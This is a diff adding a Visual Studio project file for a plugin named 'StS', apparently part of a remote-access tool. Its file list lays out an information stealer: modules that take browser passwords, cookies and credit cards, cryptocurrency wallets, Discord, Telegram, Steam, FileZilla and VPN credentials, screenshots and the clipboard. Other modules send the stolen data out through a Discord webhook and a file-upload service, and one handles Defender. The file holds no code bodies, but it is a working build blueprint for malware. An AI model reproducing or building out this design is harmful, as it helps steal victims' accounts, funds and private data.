@@ -1,0 +1,224 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" />
+  <Import Project="..\..\..\packages\ILMerge.3.0.41\build\ILMerge.props" Condition="Exists('..\..\..\packages\ILMerge.3.0.41\build\ILMerge.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4FA694D2-75EF-4DA3-8CBA-74D98EB28A4C}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <RootNamespace>Plugin</RootNamespace>
+    <AssemblyName>StS</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\..\..\Binaries\Debug\Plugins\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\..\..\Binaries\Release\Plugins\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <AutoGenerateBindingRedirects>false</AutoGenerateBindingRedirects>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="MessagePackLib">
+      <HintPath>..\..\..\MessagePack\bin\Debug\MessagePackLib.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http">
+      <HintPath>C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.5\System.Net.Http.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Config.cs" />
+    <Compile Include="Connection.cs" />
+    <Compile Include="Helpers\AES.cs" />
+    <Compile Include="Helpers\Counter.cs" />
+    <Compile Include="Helpers\Filemanager.cs" />
+    <Compile Include="Helpers\GenStrings.cs" />
+    <Compile Include="Helpers\Help.cs" />
+    <Compile Include="Helpers\WinAPI.cs" />
+    <Compile Include="Packet.cs" />
+    <Compile Include="Plugin.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Resources\Discord\AnonFile.cs" />
+    <Compile Include="Resources\Discord\AnonFileWrapper.cs" />
+    <Compile Include="Resources\Discord\defender.cs" />
+    <Compile Include="Resources\Discord\DiscordWebhook.cs" />
+    <Compile Include="Resources\DotNetZip\CRC32.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ComHelper.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\EncryptionAlgorithm.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Events.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Exceptions.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ExtractExistingFileAction.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\FileSelector.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\OffsetStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Shared.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\WinZipAes.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipConstants.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipCrypto.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipDirEntry.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Extract.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Read.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Write.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntrySource.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipErrorAction.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.AddUpdate.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Check.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Events.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Extract.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Read.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Save.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.SaveSelfExtractor.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Selector.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.x-IEnumerable.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipInputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipOutputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipSegmentedStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Deflate.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\DeflateStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\GZipStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Inflate.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\InfTree.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ParallelDeflateOutputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Tree.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Zlib.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibBaseStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibCodec.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibConstants.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibStream.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Banking.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Common.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Decryptor.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Json.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Paths.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Profile.cs" />
+    <Compile Include="Targets\Browsers\Helpers\SQLite.cs" />
+    <Compile Include="Targets\Browsers\Helpers\SqlReader.cs" />
+    <Compile Include="Targets\Browsers\Helpers\Utils.cs" />
+    <Compile Include="Targets\Browsers\Stealer.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\BrowserUtils.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\AesGcm.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\AutoFill.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\Bookmarks.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\Cookies.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\CreditCards.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\Downloads.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\History.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Chromium\Passwords.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Edge\AutoFill.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Edge\Bookmarks.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Edge\CreditCards.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Edge\Edge.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Firefox\Bookmarks.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Firefox\Cookies.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Firefox\FireFox.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Firefox\History.cs" />
+    <Compile Include="Targets\Browsers\Targets\Browsers\Firefox\Passwords.cs" />
+    <Compile Include="Targets\Browsers\URLSearcher.cs" />
+    <Compile Include="Targets\Crypt\%40StartWallets.cs" />
+    <Compile Include="Targets\Crypt\Armory.cs" />
+    <Compile Include="Targets\Crypt\AtomicWallet.cs" />
+    <Compile Include="Targets\Crypt\BitcoinCore.cs" />
+    <Compile Include="Targets\Crypt\Bytecoin.cs" />
+    <Compile Include="Targets\Crypt\DashCore.cs" />
+    <Compile Include="Targets\Crypt\Electrum.cs" />
+    <Compile Include="Targets\Crypt\Ethereum.cs" />
+    <Compile Include="Targets\Crypt\Exodus.cs" />
+    <Compile Include="Targets\Crypt\Jaxx.cs" />
+    <Compile Include="Targets\Crypt\LitecoinCore.cs" />
+    <Compile Include="Targets\Crypt\Monero.cs" />
+    <Compile Include="Targets\Crypt\Zcash.cs" />
+    <Compile Include="Targets\Discord\Discord.cs" />
+    <Compile Include="Targets\Files\Files.cs" />
+    <Compile Include="Targets\Files\Folders.cs" />
+    <Compile Include="Targets\Files\IFolders.cs" />
+    <Compile Include="Targets\FileZilla\FileZilla.cs" />
+    <Compile Include="Targets\Information\BSSID.cs" />
+    <Compile Include="Targets\Information\Buffer.cs" />
+    <Compile Include="Targets\Information\ProcessList.cs" />
+    <Compile Include="Targets\Information\Screen.cs" />
+    <Compile Include="Targets\Information\SystemInfo.cs" />
+    <Compile Include="Targets\Minecraft\VimeWorld.cs" />
+    <Compile Include="Targets\Steam\Steam.cs" />
+    <Compile Include="Targets\Telegram\Telegram.cs" />
+    <Compile Include="Targets\VPN\NordVPN.cs" />
+    <Compile Include="Targets\VPN\OpenVPN.cs" />
+    <Compile Include="Targets\VPN\ProtonVPN.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="ILMerge.props" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="ILMergeOrder.txt" />
+    <None Include="Resources\t800.exe" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.41\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.41\build\ILMerge.props'))" />
+    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+  </Target>
+  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+</Project>
